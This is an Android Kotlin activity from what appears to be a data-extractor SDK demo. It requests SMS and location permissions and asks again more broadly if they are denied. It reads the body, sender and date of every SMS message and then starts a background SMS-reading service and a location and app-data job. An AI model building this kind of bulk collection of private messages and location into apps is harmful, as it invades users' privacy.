package com.ds.extractorsdk

import Sms
import android.Manifest
import android.annotation.SuppressLint
import android.content.ContentResolver
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.widget.ListView
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.android.material.snackbar.Snackbar
import info.kalagato.com.extractor.Util
import info.kalagato.com.extractor.readers.ReadSMSService
import java.net.InetAddress
import java.net.NetworkInterface
import java.net.SocketException
import java.util.*
import kotlin.collections.ArrayList


class MainActivity : AppCompatActivity() {

    private val REQUIRED_PERMISSIONS = arrayOf(
        Manifest.permission.READ_SMS,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.ACCESS_FINE_LOCATION
    )
    private lateinit var listView:ListView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        listView = findViewById(R.id.list_view)

        requestPermissionLauncher.launch(REQUIRED_PERMISSIONS)
        getIpAddress()
        /*requestPermissions(arrayOf(Manifest.permission.READ_SMS,Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_EXTERNAL_STORAGE,Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.ACCESS_COARSE_LOCATION,Manifest.permission.ACCESS_FINE_LOCATION),101)*/

    }

    @SuppressLint("Range")
    fun getAllSms(): List<Sms>? {
        val lstSms: MutableList<Sms> = ArrayList()
        var objSms = Sms()
        val message = Uri.parse("content://sms/")
        val cr: ContentResolver = contentResolver
        val c: Cursor? = cr.query(message, null, null, null, null)
        startManagingCursor(c)
        val totalSMS: Int = c!!.count
        if (c.moveToFirst()) {
            for (i in 0 until totalSMS) {
                objSms = Sms()
                objSms.id = c.getString(c.getColumnIndexOrThrow("_id"))
                objSms.address = c.getString(c.getColumnIndexOrThrow("address"))
                objSms.msg = c.getString(c.getColumnIndexOrThrow("body"))
                objSms.readState = c.getString(c.getColumnIndex("read"))
                objSms.time = c.getString(c.getColumnIndexOrThrow("date"))
                if (c.getString(c.getColumnIndexOrThrow("type")).contains("1")) {
                    objSms.folderName = ("inbox")
                } else {
                    objSms.folderName = ("sent")
                }
                lstSms.add(objSms)
                c.moveToNext()
            }
        }
        // else {
        // throw new RuntimeException("You have no SMS");
        // }
        c.close()
        return lstSms
    }

    private val requestPermissionLauncher =
        registerForActivityResult(
            ActivityResultContracts.RequestMultiplePermissions()
        ) { result: MutableMap<String, Boolean> ->
            val deniedList: List<String> = result.filter {
                !it.value
            }.map {
                it.key
            }

            when {
                deniedList.isNotEmpty() -> {
                    val map = deniedList.groupBy { permission ->
                        if (shouldShowRequestPermissionRationale(permission)) "DENIED" else "EXPLAINED"
                    }
                    map["DENIED"]?.let {
                        // request denied , request again
                        println("Permission denied")
                        requestPermissions(arrayOf(Manifest.permission.READ_SMS,Manifest.permission.READ_PHONE_STATE,
                            Manifest.permission.READ_EXTERNAL_STORAGE,Manifest.permission.WRITE_EXTERNAL_STORAGE,
                            Manifest.permission.ACCESS_COARSE_LOCATION,Manifest.permission.ACCESS_FINE_LOCATION),101)
                    }
                    map["EXPLAINED"]?.let {
                        //request denied ,send to settings
                        println("Permission Explain denied")
                        Snackbar.make(this.findViewById(android.R.id.content), "Please open app setting to grant the permission that is required to open the app", Snackbar.LENGTH_INDEFINITE)
                            .setAction("Setting"){
                                val intent = Intent()
                                intent.action = Settings.ACTION_APPLICATION_DETAILS_SETTINGS
                                val uri: Uri = Uri.fromParts("package", packageName, null)
                                intent.data = uri
                                startActivity(intent)
                            }
                            .show()

                    }

                }
                else -> {
                    //All request are permitted
                   // val list = getAllSms()
                    //setting alarm for SMS and App data
                    //setting alarm for SMS and App data
                    val serviceIntent = Intent(this, ReadSMSService::class.java)
                    ContextCompat.startForegroundService(this, serviceIntent)
                    // for location and background app data
                    // for location and background app data
                    Util.scheduleJob(applicationContext)


                }
            }
        }


    private fun getIpAddress(): String {
        var ip = ""
        try {
            val enumNetworkInterfaces: Enumeration<NetworkInterface> = NetworkInterface
                .getNetworkInterfaces()
            while (enumNetworkInterfaces.hasMoreElements()) {
                val networkInterface: NetworkInterface = enumNetworkInterfaces
                    .nextElement()
                val enumInetAddress: Enumeration<InetAddress> = networkInterface
                    .inetAddresses
                while (enumInetAddress.hasMoreElements()) {
                    val inetAddress: InetAddress = enumInetAddress.nextElement()
                    if (inetAddress.isSiteLocalAddress) {
                        ip += inetAddress.hostAddress
                    }
                }
            }
        } catch (e: SocketException) {
            // TODO Auto-generated catch block
            e.printStackTrace()
            ip += """
            Something Wrong! ${e.toString().toString()}
            
            """.trimIndent()
        }
        Log.d("TAG", "getIpAddress: $ip")
        return ip
    }


    // 2nd method to get the permission
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        for ( permission in permissions){
            if(ActivityCompat.shouldShowRequestPermissionRationale(this, permission)){
                //denied
                Log.e("denied", permission);
            }else{
                if(ActivityCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED){
                    //allowed
                    Log.e("allowed", permission)
                } else{
                    //set to never ask again
                    Log.e("set to never ask again", permission)
                    //do something here.
                }
            }
        }
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
    }

}